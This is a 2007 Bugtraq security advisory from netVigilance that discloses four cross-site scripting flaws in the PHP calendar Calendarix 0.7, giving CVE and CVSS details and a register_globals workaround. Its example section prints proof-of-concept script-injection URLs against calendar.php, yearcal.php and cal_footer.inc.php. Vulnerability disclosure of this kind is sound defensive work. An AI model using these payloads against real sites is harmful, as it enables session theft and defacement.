
Date: 25 Jun 2007 16:24:59 -0000
From: securityresearch@...vigilance.com
To: bugtraq@...urityfocus.com
Subject: Calendarix version 0.7. 20070307 Multiple XSS Attacks

	netVigilance Security Advisory #37

Calendarix version 0.7. 20070307 Multiple XSS Attacks 
Description:
Calendarix is a powerful and easy to use calendar based on PHP and MySQL. It has been developed with ease of use and quick access to information in mind.  It provides the user with the quickest possible navigation and accessing the most commonly used functions in the shortest steps.

Successful exploitation requires PHP register_globals set to On for the first and second vulnerabilities.
External References: 
Mitre CVE:  CVE-2007-3182
NVD NIST: CVE-2007-3182
OSVDB: 35372

Summary: 
Calendarix is a powerful and easy to use calendar based on PHP and MySQL.
Security problem in the product allows attackers to conduct XSS attacks.

Advisory URL: 
http://www.netvigilance.com/advisory0037

Release Date:
06/19/2007

Severity:
Risk: Medium
 
CVSS Metrics:
Access Vector: Remote
Access Complexity: High
Authentication: Not-required
Confidentiality Impact: Partial
Integrity Impact: Partial
Availability Impact: Partial 
Impact Bias: Normal
CVSS Base Score: 5.6
 
Target Distribution on Internet: Low
 
Exploitability: Functional Exploit
Remediation Level: Workaround
Report Confidence: Uncorroborated
 
Vulnerability Impact: Attack
Host Impact: XSS Attack

SecureScout Testcase ID:
TC 17965 
Vulnerable Systems:
Calendarix version 0.7. 20070307

Vulnerability Type:
XSS (Cross-Site Scripting) to force a web-site to display malicious contents to the target, by sending a specially crafted request to the web-site. The vulnerable web-site is not the target of attack but is used as a tool for the hacker in the attack of the victim.

Vendor:
Vincent Hor (Calendarix Enterprise) 

Vendor Status: 
Vincent Hor of Calendarix Enterprise was not interested in coordinating release of Patch and Security Advisory, There is no official solution at this time.
Workaround:
In the php.ini file set register_globals = Off. 
Example: 
XSS Attack Vulnerability 1:
REQUEST:
http://[TARGET]/[PRODUCT-DIRECTORY]/calendar.php?year=<script>alert(document.cookies)</script>
REPLY:
will execute <script>alert(document.cookie)</script>

XSS Attack Vulnerability 2:
REQUEST:
http://[TARGET]/[PRODUCT-DIRECTORY]/calendar.php?month="><script>alert(document.cookies)</script>
REPLY:
will execute =<script>alert(document.cookie)</script>
XSS Attack Vulnerability 3:
REQUEST:
http://[TARGET]/[PRODUCT-DIRECTORY]/yearcal.php?ycyear=<script>alert(document.cookies)</script>
REPLY:
will execute =<script>alert(document.cookie)</script>
XSS Attack Vulnerability 4:
REQUEST:
http://[TARGET]/[PRODUCT-DIRECTORY]/cal_footer.inc.php?leftfooter=<script>alert(document.cookies)</script>
REPLY:
will execute =<script>alert(document.cookie)</script>
Credits: 
Jesper Jurcenoks
Co-founder netVigilance, Inc
www.netvigilance.com
??

??

??

??




	
